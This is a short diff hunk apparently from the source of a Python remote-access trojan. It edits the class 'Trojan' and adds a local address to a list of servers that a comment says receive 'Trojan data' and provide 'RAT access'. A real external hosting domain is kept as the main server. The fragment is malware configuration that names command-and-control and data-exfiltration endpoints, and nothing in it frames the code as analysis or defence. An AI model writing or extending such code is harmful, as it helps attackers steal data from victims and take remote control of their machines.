@@ -58,6 +58,8 @@ class Trojan:
         # Write there all URLs which will be used for sending
         # Trojan data, and RAT access.
         self.__server_urls = [
+            # Local server (Favorite server)>
+            "http://127.0.0.1",
             # Main server:
             "https://nomistic-curve.000webhostapp.com"
         ]
